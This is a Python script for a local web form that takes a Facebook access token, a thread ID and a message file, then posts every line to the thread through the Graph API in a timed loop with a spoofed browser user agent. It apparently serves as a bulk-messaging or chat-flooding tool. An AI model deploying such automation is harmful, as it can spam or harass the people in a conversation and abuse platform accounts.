#!/usr/bin/env python3
import http.server
import socketserver
import cgi
import requests
import time
import json
import os

PORT = 5000

class MessengerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>💖 MARINA KHAN MESSENGER TOOL 💖</title>
  <style>
    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      min-height: 100vh;
    }
    .container {
      max-width: 500px;
      background: white;
      border-radius: 10px;
      padding: 20px;
      margin: 0 auto;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
    }
    h1 {
      text-align: center;
      color: white;
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input, textarea {
      width: 100%;
      padding: 8px;
      border: 1px solid #ddd;
      border-radius: 5px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
    .footer {
      text-align: center;
      color: white;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>💖 MARINA KHAN MESSENGER TOOL 💖</h1>
  
  <div class="container">
    <form action="/send" method="post" enctype="multipart/form-data">
      <div class="form-group">
        <label>🔑 Access Token:</label>
        <input type="text" name="accessToken" required>
      </div>
      
      <div class="form-group">
        <label>💬 Thread ID:</label>
        <input type="text" name="threadId" required>
      </div>
      
      <div class="form-group">
        <label>👤 Sender Name:</label>
        <input type="text" name="kidx" required>
      </div>
      
      <div class="form-group">
        <label>📄 Messages File:</label>
        <input type="file" name="txtFile" accept=".txt" required>
      </div>
      
      <div class="form-group">
        <label>⏰ Delay (seconds):</label>
        <input type="number" name="time" value="5" required>
      </div>
      
      <button type="submit">🚀 Start Sending Messages</button>
    </form>
  </div>
  
  <div class="footer">
    <p>&copy; 2024 💖 Developed by Marina Khan</p>
    <p>⚡ Simple Messenger Tool</p>
  </div>
</body>
</html>
            '''
            self.wfile.write(html_content.encode())
        else:
            super().do_GET()

    def do_POST(self):
        if self.path == '/send':
            try:
                # Parse form data
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={'REQUEST_METHOD': 'POST',
                           'CONTENT_TYPE': self.headers['Content-Type']}
                )
                
                # Get form values
                access_token = form['accessToken'].value
                thread_id = form['threadId'].value
                mn = form['kidx'].value
                time_interval = int(form['time'].value)
                
                # Get file content
                file_item = form['txtFile']
                if file_item.file:
                    messages = file_item.file.read().decode('utf-8').splitlines()
                    
                    # Send response first
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    response_html = '''
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>✅ Messages Sent</title>
                        <style>
                            body { 
                                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                                color: white; 
                                font-family: Arial; 
                                text-align: center; 
                                padding: 50px;
                            }
                            .container {
                                background: white;
                                color: #333;
                                padding: 30px;
                                border-radius: 10px;
                                max-width: 500px;
                                margin: 0 auto;
                            }
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h1>✅ Messages Started Sending!</h1>
                            <p>Check your terminal for progress...</p>
                            <a href="/">← Back to Tool</a>
                        </div>
                    </body>
                    </html>
                    '''
                    self.wfile.write(response_html.encode())
                    
                    # Start sending messages in background
                    self.send_messages(access_token, thread_id, mn, messages, time_interval)
                    
                else:
                    self.send_error(400, "No file uploaded")
                    
            except Exception as e:
                self.send_error(500, f"Error: {str(e)}")
        else:
            self.send_error(404)

    def send_messages(self, access_token, thread_id, mn, messages, time_interval):
        """Send messages to the thread"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36',
            'Accept': 'application/json',
        }
        
        print(f"🚀 Starting to send {len(messages)} messages...")
        
        for i, message1 in enumerate(messages):
            try:
                message = f"{mn} {message1}"
                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
                parameters = {'access_token': access_token, 'message': message}
                
                response = requests.post(api_url, data=parameters, headers=headers)
                
                if response.status_code == 200:
                    print(f"✅ [{i+1}/{len(messages)}] Sent: {message}")
                else:
                    print(f"❌ [{i+1}/{len(messages)}] Failed: {message}")
                
                time.sleep(time_interval)
                
            except Exception as e:
                print(f"⚠️ Error: {e}")
                time.sleep(30)

print(f"🚀 Server starting on port {PORT}...")
print(f"📱 Open: http://localhost:{PORT}")
print("💖 By: Marina Khan")

with socketserver.TCPServer(("", PORT), MessengerHandler) as httpd:
    httpd.serve_forever()
